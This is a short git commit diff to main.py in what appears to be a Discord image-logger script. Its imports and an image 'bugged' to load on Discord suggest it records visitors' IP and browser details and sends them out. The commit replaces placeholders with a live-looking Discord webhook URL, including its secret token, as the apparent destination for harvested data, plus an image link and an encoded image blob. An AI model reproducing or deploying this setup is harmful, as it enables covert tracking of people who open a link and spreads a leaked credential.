03052b8e9fd062414ab341a8c30f06d64e72e8c0
Kurruptedd <111321684+Kurruptedd@users.noreply.github.com>
2022-08-15 16:49:02 -0700

    Update main.py

--- main.py
+++ main.py
@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'WEBHOOK'
+webhook = 'https://discord.com/api/webhooks/1008880993287024770/2Yg7AXiM9r8KGqTFumRZjifXjiKQBuam3dRnCIq4m040dwlC-kF9lNIrxugshAIKVDW8'
 
-bindata = httpx.get('link to image here').content
+bindata = httpx.get('https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Black_colour.jpg/1200px-Black_colour.jpg').content
 buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
